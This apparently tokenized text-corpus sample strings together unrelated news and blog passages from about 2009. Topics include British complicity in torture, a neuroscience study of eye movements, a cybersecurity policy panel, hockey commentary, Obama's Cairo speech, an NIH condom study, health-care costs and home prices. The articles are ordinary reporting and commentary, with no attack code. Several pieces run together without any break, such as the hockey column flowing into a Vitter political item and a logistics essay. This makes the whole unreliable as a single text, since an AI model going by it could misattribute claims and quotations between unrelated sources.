Davis went on : " The intelligence officer who wrote to the Pakistanis did so in full knowledge of the normal methods used by the ISI against terrorist suspects that it holds . "
Davis said Ahmed was " viciously tortured by the ISI .
He [ Ahmed ] claims among other things , he was beaten with wooden staves , the size of cricket stumps , whipped with a three - foot length of tyre rubber and had three fingernails removed from his left hand .
There is a dispute between British intelligence officers as to exactly when his fingernails were removed , but an independent pathologist confirmed it happened during the period when he was in Pakistani custody . "
Davis called on ministers to examine the in camera sections of legal argument before Ahmed 's trial and all relevant police and intelligence agency records ; publish current guidelines on interrogation of detainees held overseas ; and establish if any intelligence officer was disciplined .
" The judge in the court case intimated that disciplinary action should be considered .
Was this done ?
If not , why not ? "
Davis also said there was a pressing need for an inquiry into Britain 's involvement in torture .
" The Americans have made a clean breast of their complicity , whilst explicitly not prosecuting the junior officers who were acting under instruction .
We have done the opposite .
As it stands , we are awaiting a police investigation which will presumably end in the prosecution of frontline officers .
At the same time the government is fighting tooth and nail to use state secrecy to cover up both crimes and political embarrassments , to protect those who are the real villains of the piece , those who approved the policies in the first place . "

Researchers at the Center for Molecular and Behavioral Neuroscience ( CMBN ) at Rutgers University in Newark have identified the need to develop a new framework for understanding " perceptual stability " and how we see the world with their discovery that visual input obtained during eye movements is being processed by the brain but blocked from awareness .
The process of seeing requires the eyes to move so light can hit the photoreceptors at the center of each retina , which then pass that information to the brain .
If we were cognizant of the stimulus that passes before the eyes during the two to three times they move every second , however , vision would consist of a series of sensations of rapid motion rather than a stable perception of the world .
To achieve perceptual stability , current theory has held that visual information gained during an eye movement is eliminated , as if cut off by a camera 's shutter , and removed from processing .
As published in Current Biology ( http://www.cell.com/current-biology), significant new research conducted by assistant professor Bart Krekelberg and post - doctoral researcher Tamara L. Watson now shows that theory of saccadic suppression is incorrect and what the brain is doing instead is processing information gained during eye movement but blocking it from being reported .
" Rather than completely suppressing inputs during eye movements , the brain is processing that as information it does not need to report back to awareness , " says Krekelberg .
The findings were obtained by making use of a visual illusion in which the presentation of a horizontal line makes a subsequent circle look like an ellipse .
In Watson and Krekelberg 's study , the line was presented to research participants immediately before an eye movement .
Under current theory , the line would be eliminated from visual processing and one would expect participants to report a subsequently presented circle to look like a circle .
While the research participants did not recall seeing the line , the image they reported seeing was not a circle but rather an ellipse .
In other words , the participants experienced the illusion , even though they were not aware of the line that causes the illusion .
" Although they did not recall seeing the line , the brain apparently did process the line , " says Watson .
" What this shows is that perceptual stability is not accomplished by suppressing stimuli encountered during an eye movement , or removing them from processing , but rather that those signals are prevented from reaching awareness at a later stage of processing .
Some suppression is also happening , but suppression is not enough to explain perceptual stability ; it is not the whole story . "
One reason why the brain does not discard visual input during eye movements could be that it provides useful information about eye movements .
" We speculate that the visual signals generated by eye movement may be important for determining how much and how fast the eye moved so the brain can maintain perceptual stability , " says Watson .
" It may be that these signals are useful for improving perceptual stability as long as they do not enter into awareness . "
The findings also show that a new approach is needed to gain additional understanding into the cognitive and neural functions involved in visual processing and perceptual stability .
Until now , research largely has focused on pinpointing those areas of the brain that show lower activity during an eye movement .
" What we are seeing now is that things are much more complex than we suspected , " says Krekelberg .
" We should n't just be looking at areas of reduced activity in the brain during eye movement , but for areas that may change their processing to make use of the input that arises during eye movements . "
Providing a better understanding of those changes in processing could pave the way for earlier detection and more effective treatments for those who suffer from deficits associated with eye movements .
For example , schizophrenic patients sometimes report a lack of perceptual stability .
And while dyslexia traditionally has been interpreted as a deficit in language development , it also has been found to be associated with deficits in the control of eye movements .

January 17 , 2016 : Site update
If you visit this site or follow me on any of the social media blah blahs , you 'll maybe have noticed there 's a lot less baseball - related stuff than there used to be .
Ten years ago I got into baseball ( Twins vs. Yankees , Yankee Stadium , New York , 27 July 2005 , to be precise ) .
I 've thought a lot about the ten years that baseball has existed for me .
It took about four years for it to really take over , though .
When I split off the sport-y stuff from my main site Flip Flop Flyin ' into its own site , this site , it was purely to allow the FFF followers to look at my drawings without having to wade through baseball - related stuff .
But , there was an unexpectedly large amount of interest in FFFB , and pretty soon I found myself with a contract to do a book about baseball .
And that was it for a few years .
Looking at the archive on Flip Flop Flyin ' , I still did non -baseball stuff , but I did a lot more baseball - related stuff on Flip Flop Fly Ball .
That began to swing back last year .
I kinda felt that I had less and less to say about baseball .
I still enjoyed it , still went to Diablos Rojos games , but on the whole , I was enjoying just enjoying it ; it not being part of my " career . "
And personally , that has been a rewarding change .
I 've enjoyed doing and concentrating more on art than baseball .
Baseball is a hobby .
And I very much like having that as a hobby .
So much of the Flip Flop Fly Ball stuff was about learning and trying to understand a sport and culture that were alien to me .
By the time the book came out I began to feel like I was a part of the baseball world ; certainly the baseball corner of the Internet .
I had carved out the niche -y - est of niches on Baseball Internet : The English Guy Who Watches Mexican Baseball .
Something else that probably can't be ignored is the timing of things .
At a point when my personal life was an absolute shambles , I had baseball and I had infographics to distract me .
It was very very helpful to think about statistics and facts , organising information into neat infographics at a time when my mental state was the exact opposite : unorganised and emotional .
If I read a book about the 1970s Cincinnati Reds then I do n't have to think about my failing personal life .
If I investigate the history of early 20th century players , I can distract myself from the fact that I am miserable every day .
But , there 's only so long you can fool yourself .
Several cities and loads of apartments later and I 'm still not mentally splendid , but it 's time to stop distracting myself .
Which is one of the reasons why I 'm not gonna be doing much baseball stuff on Flip Flop Fly Ball for the foreseeable future .
I 'm not killing it off , as much as that is tempting , but I am also not gonna feel guilty anymore about not updating it more regularly .
If I want to do something , I will , and if I do n't I wo n't .
That may mean there 's nothing for a few months or for a year .
It 's also possible that this simple act of writing about it might free up my mind enough to not feel any pressure to keep going with the site , and stuff might come flooding out .
I do n't know .
But right now , Flip Flop Fly Ball is on an indefinite hiatus .
I will be back at some point , just not sure when .
Thanks .

Is hacking a real threat to the United States or is it just the latest overblown threat to national security , whose magnitude is being exaggerated to expand government budgets and power ?
That 's the question asked by Threat Level editor Kevin Poulsen at a panel in Computers , Freedom and Privacy in Washington , D.C. , Wednesday .
And it 's important because the government is spending billions of dollars on computer security , and President Obama is elevating cybersecurity to a national priority , using language that makes even security experts wince .
Amit Yoran , a former Bush Administration cybersecurity czar , argues the answer is easy .
" Is hacking a national security threat ? " Yoran said .
" The one word answer is ' Yes . ' "
As proof , Yoran pointed to stories about the denial - of - service attacks in Estonia , attacks on government contractor Booz Allen Hamilton and the recently reported breach of defense contractor computers that let hackers get at information on the Joint Strike Fighter .
" Cyber 9 - 11 has happened over the last 10 years , but it 's happened slowly so we do n't see it , " Yoran said .
Poulsen called the threat of cyber - terrorism " preposterous , " citing the long - standing warnings that hackers would attack the power grid — despite the fact that it has never happened .
And he argued that calling such intrusions national security threats means information about attacks gets classified unnecessarily .
" If we can't publicly share info that the attackers already have — since it 's about them — then we are doing far more harm than good , " Poulsen said , arguing that classification makes it impossible for the security community at large to analyze or prepare defenses for such attacks .
Moreover , he pointed out the Joint Strike fighter example involved only unclassified information .
But security expert Bruce Schneier ( a Wired.com columnist ) said there are going to be cyberattacks that actually affect the real world , even though the risk is currently overblown .
" Remove the word cyber .
It 's just a new theater , " Schneier said .
" Of course there is espionage , and as data moves online , there is cyber -espionage .
But is it a real threat ? "
Schneier 's answer is yes , but not as big a threat to infrastructure as natural disasters or bad code .
" We have to be robust against hackers and Murphy , " Schneier said , referring to Murphy 's law .
Dr. Herb Lin , a cyberattack expert at the National Research Council , called the scoffing naive , saying he could imagine hackers getting into classified command - and - control systems , for one .
But he lamented that much of the current dialogue is about about cyberwar and cyber - terror , when the largest threat is in cyber - espionage — which is not considered an act of war .
" We can see why the press and government agencies talk about cyber - terror and cyberwar , " Lin said , referring ostensibly to page views and budgets , respectively .
" But we do n't consider spies inside the United States to be an attack on the United States . "
Yoran did admit that cyber - terrorism was improbable , but stuck to his point that there are significant national security threats from hackers .
Lin says the government needs to think about getting its own cyberattack capability .
" Passive defenses alone are not sufficient , " Lin said .
" You have to impose costs on an attacker and maybe the only way to do that is a cyberattack yourself .
The good guys have always had some sort of offense too . "
Lin was dumbstruck by Poulsen 's dismissal of the examples that the government , including President Obama , have used as evidence that there is a massive cybersecurity threat – specifically Obama 's recent description of a November USB thumb - drive virus attack as one of the biggest cyberattacks against the U.S. military .
" Why is something that is an obvious threat not considered a threat to national security ? "
Lin asked .
" The point is that the way you frame these issues matters , " Schneier explained .
In fact , they do matter — since now the government is pouring billions of dollars into cybersecurity for its own networks , and possibly the general public 's net — a far change from the government 's relative indifference to such issues until about two years ago .
Indeed , even Amit Yoran , who quit his post in the Bush Administration as cyber czar in October 2004 after having gotten little support during his one - year tenure , admitted his job might have been easier , and he might not have quit , if cyberattacks had the media attention then that they do now .

I can relate every aspect of my life to a Seinfeld episode .
I ’ve met a woman in a grocery store , got her number , yet never asked for her name .
I ’ve strained a hamstring kicking out tucked covers in a hotel bed , chased after a rental car bus and will forever love to stop at the duty free shop .
So , when I began thinking about some of the happenings during the plethora of off - season moves by the Blackhawks , I immediately thought of a Seinfeld episode .
Here is a rundown of off - season events , with a twist of Seinfeld .
“ We ’re collectors .
We see objects of great beauty and we must have them . ”
To the Blackhawks ’ brass .
Last off - season it was Brian Campbell and Cristobal Huet .
This year , just hours into the free agency period , they snatched Marian Hossa from the Red Wings with a deal that will keep Hossa in Chicago until he ’s 42 years old .
Former New Jersey Devil and Selke Trophy winner John Madden soon followed with another former Red Wing , Tomas Kopecky .
When the organization seems something it wants , it goes out and takes it … much like George with women he meets in an antique store .
Hopefully the ‘ Hawks do n’t serve their prized possessions prune juice .
“ It ’s like I was making a prison break , you know .
And I ’m heading for the wall , and I trip and I twist my ankle , and they throw the light on you , you know .
So , somehow I get through the crying and I keep running .
Then the cursing started .
She ’s firing at me from the guard tower : ‘ Son of a bang !
Son of a boom ! ’
I get to the top of the wall , the front door .
I opened it up , I ’m one foot away .
I took one last look around the penitentiary , and I jumped ! ”
To Martin Havlat , Nikolai Khabibulin , Sammy Pahlsson and Matt Walker .
Fans knew either three or all four would be gone by the start of next season , but no one wanted to accept it .
Meanwhile , all four gladly took the money and ran elsewhere very early in the free agency period .
The Blackhawks signed Hossa , Havlat left .
Khabibulin admitted his deal with Edmonton happened , “ very quickly , ” and the ‘ Hawks were n’t about to commit three years to him .
Pahlsson was a mid-season fix with only a small chance of him returning to Chicago .
Walker was a bit of a surprise , but Tampa Bay threw him the dollars the Blackhawks needed to sign Madden .
Curse their departures all you want , Chicago , but they were inevitable .
“ Well , you know when you break up , how you say things you do n’t mean ?
Well , he says the mean things you do n’t mean , but he means them . ”
To Havlat .
C’mon buddy , just shut up already .
The Twitter posts are enough , and the Blackhawks are yet to bite and jump into this bickering match .
The relationship was over .
Havlat wanted too many years and too much money for only one healthy season of productivity in the last three .
When Chicago realized it could get Hossa for the same cap number ( just above $ 5 million ) , the Blackhawks went the route of the consistent 40 - goal scorer .
Deal with it .
“ Well , birthdays are merely symbolic of how another year ’s gone by and how little we ’ve grown .
No matter how desperate we are that someday a better self will emerge , each flicker of the candles on the cake we know it ’s not to be .
That for the rest of our sad , wretched , pathetic lives , this is who we are to the bitter end .
Inevitably , irrevocably .
Happy birthday ?
No such thing . ”
In reference to Rocky Wirtz ’s comment about Dale Tallon ’s age in explaining Tallon ’s abrupt firing as general manager .
Wirtz said this :
Dale ’s 58 .
We always want younger people …
It ’s nothing that Dale was doing , but also Dale ’s at the tail end of his business career .
Ca n’t Tallon file a successful age discrimination lawsuit solely based off of this comment ?
The owner of the franchise admitting that he was n’t being fired for performance , but because of his age ?
I ’d hire Jackie Chiles and get it over .
Oh , yeah ?
My friend Bob Sacamano , he came in here for a hernia operation .
Oh , yeah , routine surgery .
Now he ’s sitting in a chair by a window going [ high - pitched voice ]
“ My name is Bob ! ”
To Hossa .
First , the shoulder injury was n’t that bad .
The ‘ Hawks knew about it when signing him , no big deal .
Then suddenly the new $ 68 - million man needs surgery to fix a torn tendon , keeping Hossa sidelined for the first two months of the season — at least .
As if people were n’t already lobbying to keep Havlat , the signing of Hossa now looks much worse .
But now it ’s time to get over it , accept what happened , get off to a fast start without him and welcome a superstar to the lineup when he ’s ready to play .
“ Where are you living ?
Are you here ?
Are you on this planet ?
It ’s impossible .
It ca n’t be done .
Thousands of years people have been trying to have their cake and eat it too .
So all of a sudden the two of you are going to come along and do it .
Where do you get the ego ?
No one can do it .
It ca n’t be done . ”
From all the skeptics to John McDonough and Wirtz .
A trip to the Western Conference Finals and quick exit at the hands of the mighty Detroit Red Wings seemed to ignite Blackhawks fans into this we ’re - not - ready frenzy .
McDonough and Wirtz think differently .
They signed Hossa and Madden to bring proven stars to Chicago .
They made difficult decisions in letting fan favorites walk .
And , they ’re sticking to their “ One Goal ” motto to win the Stanley Cup .
“ It ’s a perfect plan .
So devious , so inspired , yet so simple . ”
Last week , in an apparent effort to kill irony forever , the campaign of U.S. Senator David Vitter ( R - Louisiana ) produced the following web ad :
If the ad had merely focused on his Democratic rival using a free weekend to jet off to a fundraiser , it might have been an effective ad .
But for a guy like Vitter , whose name was once prominently located on a madam 's client list , to use the word " luvfest " to describe the confab was an invitation to ridicule .
And , as it turned out , said ridicule was quickly delivered by the Louisiana Democratic Party :
" In contrast to the kind of luvfest David Vitter is used to , this trip was legal , public and no money changed hands ' " said Louisiana Democratic Party spokesman Kevin Franck .
" As we all remember , the last time David Vitter made public comments about a ' luvfest ' he end up begging for forgiveness .
I am anticipating an apology from him for this web ad in the near future . "
Franck also said that Melancon himself did not take campaign contributions at the event , which if true would further undercut the whole message of Vitter 's Web ad .
Recent polling in the Pelican State has Vitter under 50 % , with a re-elect in the high 30s .
Making himself such an easy target for ridicule did not help matters much , one would imagine .
The famous Traveling Salesman math puzzle is much more than just a fun game .
It ’s a dramatically illustrated way to understand the efficiencies involved in product distribution models .
The problem works like this :
Take a map and draw dozens of dots on it .
The salesman ’s task is to define a driving route that visits each dot , with the minimum driving distance connecting them all .
He has to visit so many locations , and he wants to burn as little gas as possible .
Obviously this is something that people are looking at harder than ever today .
There ’s a very cool piece of freeware software that uses a genetic algorithm to solve the Traveling Salesman problem .
It ’s by Michael Lalena and is found at http://www.lalena.com/AI/Tsp/.
Draw dozens ( or hundreds ) of dots , and the software will start with a random route and then refine it iteratively until it ’s super efficient .
It ’s fun trying to stump it with a zillion dots in a pattern that appears to be hard to traverse , and then to see what a surprisingly simple curve it finds to visit them all .
Many years ago I did some consulting for a company that was then called Henry ’s Marketplace , a produce retailer built on the founding principles of locally grown food .
They had grown from a single family fruit stand into a chain of stores throughout southern California and Arizona that stuck to its guns and sold produce from small , local farmers .
It ’s a business beloved by its customers for its image of wholesome family goodness , community , and healthful products .
( Henry ’s has since gone through several acquisitions and is now called Henry ’s Farmers Markets . )
Part of what I helped them with was the management of product at distribution centers .
This sparked a question : I had assumed that their “ locally grown produce ” model meant that they used no distribution centers .
What followed was a fascinating conversation where I learned part of the economics of locally grown produce .
It was an eye - opening experience .
In their early days , they did indeed follow a true farmers ’ market model .
Farmers would either deliver their product directly to the store , or they would send a truck out to each farmer .
As they added store locations , they continued practicing direct delivery between farmer and store .
Adding a store in a new town meant finding a new local farmer for each type of produce in that town .
Usually this was impossible : Customers do n’t live in the same places where farms are found .
Farms are usually located between towns .
So Henry ’s ended up sending a number of trucks from different stores to the same farm .
Soon , Henry ’s found that the model of minimal driving distance between each farm and each store resulted in a rat ’s nest of redundant driving routes crisscrossing everywhere .
What was intended to be efficient , local , and friendly , turned out to be not just inefficient , but grossly inefficient .
Henry ’s was burning huge amounts of diesel that they did n’t need to burn .
You can guess what happened .
They began combining routes .
This meant fewer , larger trucks , and less diesel burned .
They experimented with a distribution center to serve some of their closely clustered stores .
The distribution center added a certain amount of time and labor to the process , but it ( a ) still accomplished same - day morning delivery from farm to store , and ( b ) cut down on mileage tremendously .
Henry ’s added larger distribution centers , and realized even better efficiency .
Today their model of distributing locally grown produce , on the same day it comes from the farm , is hardly distinguishable from the models of Wal - Mart or any other large retailer .
Here ’s where it seems counterintuitive :
If you look at the path traveled by any one given box of produce , it ’s much longer than it used to be .
It no longer travels in a single straight line from farm to store ; it now travels the two long sides of the triangle in its path from farm to distribution center to store .
But quite obviously , this narrow view omits the overall picture , where the stores are all stocked with produce that got there much more efficiently .
Locally grown produce is rarely efficient .
Apply a little mathematics to the problem , and you ’ll find that the ugly alternative of giant suburban distribution centers accomplishes the same thing – fresh produce into stores on the same day it ’s picked – but with much less fuel burned .
This even extends to local farmers ’ markets like you may have in your town , where all the family farmers personally bring their produce to the market to sell .
Imagine a map with the market in the center , and the round - trip routes driven by all ~ 20 vendors radiating out from the market , like the arms of a starfish .
Applying our Traveling Salesman model to this map , it ’s clear that the farmers ’ market is the least efficient model possible , if you are measuring efficiency in terms of delivery miles driven and gallons of diesel burned .
To properly restructure this model to be as efficient as its proponents believe it to be , you ’d drive a single truck in a calculated route to visit each farm in the morning , sell all the goods in a single store , and then discard or donate the leftover food ( why double the driving miles to return perishable goods to the farmers ? ) .
Do n’t get me wrong , I love farmers ’ markets .
We go to our local one sometimes and it ’s a fun family event for us .
We love the giant , wonderful tomatoes and strawberries that you ca n’t get at the supermarket .
I ’d hate to see the experience replaced by the efficient alternative I just described , but then , I understand that farmers ’ markets are more of a premium boutique community experience than an efficient ( or “ green ” ) way to buy food .
The real reasons to enjoy your farmers ’ market have nothing to do with it being somehow magically environmentally friendly .
It ’s the opposite .
Too often , environmentalists are satisfied with the mere appearance and accoutrements of environmentalism , without regard for the underlying facts .
Apply some mathematics and some economics , and you ’ll find that a smaller environmental footprint is the natural result of improved efficiency .

Barack Obama today appealed for a new beginning in relations between America and the world 's Muslims in a much - anticipated speech in Cairo , while delivering a blunt message to Israel over settlements .
The US president paid tribute to Islam 's influence on religion , culture and civilisation , and started with the traditional Arabic greeting assalaamu alaykum – peace be upon you – to thunderous applause .
Then in an appeal to form a common front against extremists , Obama said the " cycle of suspicion and discord " between the west and Islam must end .
" I have come here to seek a new beginning between the United States and Muslims around the world : one based upon mutual interest and mutual respect ; and one based on the truth that America and Islam are not exclusive , " he said .
As expected , Obama made proud reference to his own Muslim roots , mentioning his childhood in Indonesia and waking to the sound of the " azaan " call to prayer .
He stressed the common ground between the west and Islam , saying that " Islam has always been a part of America 's story " .
Obama said Islamic teachings , far from being the source of conflict , could help to bring about peace : " The Holy Qur 'an teaches that whoever kills an innocent , it is as if he has killed all mankind ; and whoever saves a person , it is as if he has saved all mankind …
Islam is not part of the problem in combating violent extremism – it is an important part of promoting peace , " he said .
In one of the most eagerly awaited elements of the speech , he issued a tough message to Israel that went down well with his audience : stop building settlements on land claimed by Palestinians .
Marking a change from the Bush administration , Obama said : " Israelis must acknowledge that just as Israel 's right to exist cannot be denied , neither can Palestine's .
The United States does not accept the legitimacy of continued Israeli settlements .
This construction violates previous agreements and undermines efforts to achieve peace .
It is time for these settlements to stop . "
While Obama had made similar statements to the Israeli prime minister , Binyamin Netanyahu , the tone of his remarks before an Arab audience took on a special resonance .
At the same time he sent a clear message to Palestinian militants to abandon violence , saying : " It is a sign of neither courage nor power to shoot rockets at sleeping children , or to blow up old women on a bus . "
The Arab - Israeli conflict , Obama added , " should no longer be used to distract the people of Arab nations from other problems .
Instead it must be a cause for action to help the Palestinian people develop the institutions that will sustain their state ; to recognise Israel 's legitimacy ; and to choose progress over a self - defeating focus on the past . "
Obama 's comments in support of democracy – a burning issue in Egypt and in almost all Arab countries – were non-specific , which may disappoint activists in Egypt and elsewhere , but they were greeted with cheers of support from some members of the audience .
In a clear rejection of the Bush doctrine of regime change and attempts to impose democracy , Obama said : " America does not presume to know what is best for everyone , just as we would not presume to pick the outcome of a peaceful election .
But I do have an unyielding belief that all people yearn for certain things : the ability to speak your mind and have a say in how you are governed . "
Obama defended his strategies in both Afghanistan and Iraq but made clear he did not wish to maintain a permanent presence in either country .
On the burning issue of Iran and nuclear weapons he issued a stark warning : " We have reached a decisive point .
This is not simply about America 's interests .
It is about preventing a nuclear arms race in the Middle East that could lead this region and the world down a hugely dangerous path . "
Unprecedented security measures were in place for Obama 's big day , which included a tour of the pyramids on Cairo 's outskirts and a medieval mosque .
Earlier he spoke to the Egyptian president , Hosni Mubarak , before giving his 45 - minute address .
A social media networking blitz by the White House helped publicise the speech in an effort to generate discussion .
The Muslim world largely welcomed the speech , although some said it lacked concrete proposals .
" There is a change between the speech of President Obama and previous speeches made by George Bush , " said Fawzi Barhoum , a Hamas spokesman in Gaza , " ... but the statements of today did not include a mechanism that can translate his wishes and views into actions . "
In Iran , Mohammad Ali Abtahi , a cleric who was vice - president under the reformist president , Mohammad Khatami , called the speech " compensation to the hostile environment which was created during President Bush " .
The director of Israel 's government press office , Danny Seaman , said Obama 's speech was " not bad " .
" All in all , his attitude is one we certainly share as a democratic country , " he said .
" The state of Israel is n't against reconciliation ...
We think we should be more cautious and it should be done in such a way that the extremists should n't take control , " he said .
Following his recording yesterday , Osama bin Laden , the al - Qaida leader , to told Muslims that alliances with Christians and Jews would annul their faith .
He called on them to fight allies of the " infidels " in Muslim countries .

NEW YORK ( Reuters ) - The U.S. Justice Department is increasing its prosecutions of alleged acts of foreign bribery by U.S. corporations , forcing them to take costly steps to defend against scrutiny , The Wall Street Journal reported on Monday .
At least 120 companies are under investigation , the paper cited Mark Mendelsohn , a deputy chief in the Justice Department division overseeing the prosecutions , as saying .
That is up from 100 at the end of last year .
The effort began in the wake of a series of business scandals earlier this decade , including the collapse of Enron , that stirred up a corporate - reform movement , the paper said .
Today , companies across the United States are working to determine if they are at risk , the paper said
In some instances , companies have called the Justice Department to come clean , in hopes of obtaining leniency , it added .
Why Are Condoms Disliked by So Many Men ?
The National Institutes of Health spent nearly 500 K on a condom study .
June 20 , 2009  --
The federal government has spent nearly half a million dollars to fund a study to find out why some men would prefer not to wear condoms during sex .
The National Institute of Child Health and Human Development , a branch of the National Institutes of Health , has awarded a $ 423,500 grant to researchers at The Kinsey Institute for Research in Sex , Gender and Reproduction .
The Bloomington , Ind. , based research team will use the funding to study " barriers to correct condom use , " according to a release from the institute .
" This project aims to advance our understanding of , among other factors , the role of cognitive and affective processes and condom application skills in explaining problems with condom use in young , heterosexual adult men , " reads an excerpt of the study , which will be funded through May 2011 .
But critics are n't so sure that this is the way the government should be spending taxpayer dollars .
One of those people is Jazz Shaw , the assistant editor for the news blog Themoderatevoice.com , who says that if the researchers really wanted to know why guys do n't like wearing condoms , they should have just asked the average guy .
" Government at all levels leaves itself open to ridicule by not thinking these things through , " Shaw said in an e-mail to ABCNews.com .
" Men do n't enjoy wearing condoms and we already know this . "
" If what the NIH actually plans to study is condom failure rates or design deficiencies leading to difficulty in using the product , they should name the study appropriately and focus on those areas , " Shaw said .
Repeated calls and messages to the NIH left by ABCNews.com were not immediately returned , but according to its
Web site , it provides more than $ 30 billion for research every year , making the funding for this study a mere pittance in comparison to the larger picture .
The two leaders of the study , scientists Erick Janssen and Stephanie Sanders , also did not respond to requests for comment .
Asked to elaborate on why , exactly , men often put up a fight when they 're asked to wear a condom , Shaw said the feeling experienced during intercourse is altered -- and not for the better -- by the condom .
" The physical sensation is simply not the same , " Shaw said .
" Also , it 's an interruption when a couple is in the ' heat of the moment ' where you have to change focus to something decidedly unromantic , " he said .
" [ It 's ] pretty much the same as if the woman , at the same juncture , needs to jump up , run to the bathroom and insert a diaphragm .
It breaks the mood .
" Men wear them because they are slightly more desirable than a combination of embarrassing diseases , 20 years of child support payments and death , " Shaw said .
" And if you took the death part out of the equation , a frightening number of us would probably still roll the dice on it if the lady was willing . "
Condom Study to Be Carried Out in Two Phases
The project will be split up into two phases , the first to be focused on asking men about " various issues of arousal and sensation , including physical experience and perceptions about condoms , " according to the institutes release on the study .
The second phase will be more laboratory oriented and will focus on " penile erection and sensitivity during condom application . "
One of the main goals of the study is to understand the link between condom application and the loss of erections and decreased sensation experienced by men .
David Williams , the vice president for policy at Citizens Against Government Waste , a non-profit watchdog group that tracks mismanagement and wasteful spending by the government , said that he is " frustrated " by the grant .
" It 's hard to see this kind of research going on when we have such bigger problems as a country that we need to face , " Williams said .
" The NIH is studying things that on the face of it sounds like it is n't really needed right now or that the answers are pretty obvious at times . "
Williams concedes that while the amount of money given to this project is a " drop in the bucket " compared to the total amount of monetary support the NIH doles out each year , he says that cutting back on several projects like this one could go a long way .
" There needs to be more scrutiny over what is and is not funded , " he said .
" People do n't seem to think the government has priorities and this grant is really just another example of that , " Williams said .
" We 're all trying to make ends meet here and the government is doing a study on condom use . "
If Americans hope to discuss health care , climate change , green economics or public infrastructure with any degree of realism , then the time has come to acknowledge that hearing someone say “ a trillion dollars ” is no reason to panic .
Politicians and pundits cite that figure to argue that we cannot afford health care reform , following recent cost estimates by the Congressional Budget Office , but the plain truth is that we spend ( and squander ) more than that on purposes not nearly so wise and humane as universal quality health care .
As a matter of fact , America ’s current health care system wastes considerably more than a trillion dollars every year .
We know that because countries such as France , Germany , Japan and Finland , with standards of living comparable to ours , spend roughly half what the United States spends annually on health care per citizen , while they cover everyone and achieve better results .
So if the total cost of American health care over the coming decade reaches $ 40 trillion , as economists expect , then we will be “ wasting ” approximately $ 20 trillion , or $ 2 trillion a year .
Compared with figures such as those , the CBO scoring estimate of $ 1.6 trillion over 10 years to reform the U.S. health care system is so small as to be almost negligible .
Constantly hearing numbers that sound so large makes perspective even more important .
When Princeton health economist Uwe Reinhardt actually did the simple calculations , he found that the price of reform amounted to only 4 percent of the country ’s cumulative health care budget between next year and 2020 .
He noted that this amount is much less than the annual increase in health care spending over the past 10 years .
And he also pointed out that on the broader economic horizon , $ 1.6 trillion represents only about 1 percent of the $ 170 trillion in gross domestic product that Americans will produce over the same period .
Investing a trillion dollars or so in modernizing and improving our health care system is a good bargain — especially when contrasted with the maddening way that we have thrown away tax dollars over the past several years .
Undoubtedly the worst example of wasteful spending in recent memory is the war in Iraq , that imperial misadventure so beloved by the same conservative thinkers who incessantly bemoan the supposedly unaffordable price of health reform .
Touted early on by its eager promoters as free , cheap or self - financing , the war ’s ultimate cost is currently expected to run as high as $ 3 trillion , according to Joseph Stiglitz , the Nobel laureate economist who wrote a book on the subject last year with his colleague Linda Bilmes .
Even as the Obama administration is pulling U.S. troops out of Iraqi cities in preparation for eventual withdrawal , the Iraq war will remain a financial black hole in the federal budget for many years to come as we continue to support the injured veterans and to rebuild the damaged American military .
Yes , a trillion dollars is a significant amount of money , even on a scale as large as the American economy .
Had we avoided the stupid waste of $ 2 trillion or $ 3 trillion on the war , we could have paid for a long list of social goods that would have improved the lives of the American people , enhanced their productivity and secured their future .
To name only a few of many better choices , we could have moved rapidly toward alternative energy sources and reduced our dependence on foreign sources of oil for about $ 500 billion , achieved universal literacy in the United States for about $ 5 billion , rebuilt the Gulf Coast damaged by Hurricane Katrina for about $ 200 billion , ended hunger and all the diseases caused by poverty for another $ 200 billion — and still have a substantial sum remaining to build new schools , roads , bridges , railways and other badly needed infrastructure .
The senators who now claim that we cannot afford to spend a trillion dollars to make long overdue changes in health care know exactly what that amount can buy .
They know because they have spent it , year after year , on military misadventures and subsidies to big banks and corporations , without stinting or whining .
Why can we always afford those trillion - dollar boondoggles , but never decent health care for all Americans ?

NEW YORK ( CNNMoney.com ) --
The value of U.S. homes grew on a monthly basis in May for the first time in nearly three years , according to 20 - city index released Tuesday .
The month - over - month increase was 0.5 % , according to the report from financial data company Standard & Poor 's and economists Case - Shiller .
It was the first increase in the monthly index since July 2006 .
On an annual basis , home prices in the 20 cities fell 17.1 % , but it was the second straight month that the year - over - year decline lessened .
" This could be an indication that home price declines are finally stabilizing , " said David Blitzer , chairman of the index committee S&P , in a prepared statement .
While acknowledging that the report was good news , Mark Zandi , chief economist for Moody 's Economy.com , downplayed the importance of a single month 's statistics .
" I think it 's a temporary respite , " he said .
" It reflects the recent decline in foreclosure sales , and prices will continue to fall over the next several months . "
Robert Shiller , the Yale economist who co-founded the index and who 's famous for warning that the housing boom was , in fact , a bubble , said the decrease in foreclosure sales does show up in the index statistics as a plus for home prices .
That 's one reason he did not want to sound too optimistic ; foreclosures could take off again .
" And we could get more economic bad news , but it does look encouraging , " he said .
He added that he thought that Washington 's efforts have boosted the nation 's spirits , an important factor for the housing market .
" The government has done a lot to support the housing market , " he said .
" Confidence has improved .
People are talking about ' green shoots . '
People are thinking it 's time the recession came to an end .
The stock market is up . "
Cleveland gains :
The improvement in the index was as broad as it was deep , with 13 metro areas showing gains , compared with eight in April .
Two , New York and Tampa , Fla. , showed no change .
The biggest winner was long - suffering Cleveland , where prices rose 4.1 % .
The city still falling the most was Las Vegas , where prices declined 2.6 % .
The report added to the list of positive housing market indicators .
These include rising new home sales , increased home building and increased pending sales .
Paul Bishop , the managing director of research for the National Association of Realtors , was glad to see the upturn but did not want to overemphasize the results of a single month , saying the economy is not out of the woods yet .
" Job losses could continue after the recession ends , " he said .
" That 's where the economy intersects with consumers in the most tangible way .
Until consumers have some level of confidence that the economy is improving , many will be reluctant to buy . "
Washington 's goal : Stabilizing the housing market has been a primary goal of Washington policy makers .
Congress has tried to stimulate homebuying by creating a temporary tax credit of $ 8,000 for people who have not owned a home for at least three years .
The administration has also tried to tackle the foreclosure problem , creating a program to help mortgage borrowers avoid defaulting on their loan payments and losing their homes .
Zandi added that lenders are still figuring out the administration 's foreclosure prevention plan , and have suspended the foreclosure process for many borrowers in default .
That means fewer distressed properties , which tend to bring in lower prices , than usual .
One of the most positive things the government has done , according to Shiller , was to take control of the failing mortgage companies Fannie Mae and Freddie Mac .
These were government sponsored enterprises that guaranteed a flow of mortgage lending by buying or backing mortgages in the secondary market .
Without government backing up these companies , mortgage lending would have dried up , which would have devastated home sales .
Lower prices : Prices have also fallen so far in so many places that it 's drawing people back into the market .
In Las Vegas , prices are off about 53 % from their peak , set in August 2006 .
Phoenix prices are down 54 % .
Overall , the 20 - city index is down more than 32 % from its high .
Interest rates were very low in May , which also could have helped the housing market .
